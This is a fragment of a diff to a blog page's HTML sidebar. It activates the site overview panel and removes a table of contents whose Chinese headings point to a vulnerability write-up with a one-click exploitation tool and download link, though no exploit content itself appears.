-          <li class="sidebar-nav-overview" data-target="site-overview">
-            站点概览
-          </li>
-        </ul>
-      
 
-      <section class="site-overview sidebar-panel">
+      <section class="site-overview sidebar-panel sidebar-panel-active">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
           <img class="site-author-image" itemprop="image"
                src="/pic/favico.jpg"
@@ -772,22 +721,6 @@ config/config.inc.php12345678910111213141516171819202122232425262728293031$lango
 
       </section>
 
-      
-      <!--noindex-->
-        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-              
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞解析："><span class="nav-number">1.</span> <span class="nav-text">漏洞解析：</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#文件命名方式："><span class="nav-number">1.1.</span> <span class="nav-text">文件命名方式：</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#一键化利用工具："><span class="nav-number">2.</span> <span class="nav-text">一键化利用工具：</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#文件说明"><span class="nav-number">3.</span> <span class="nav-text">文件说明</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#下载地址："><span class="nav-number">4.</span> <span class="nav-text">下载地址：</span></a></li></ol></div>
-            
-
-          </div>
-        </section>
-      <!--/noindex-->
       
 
       
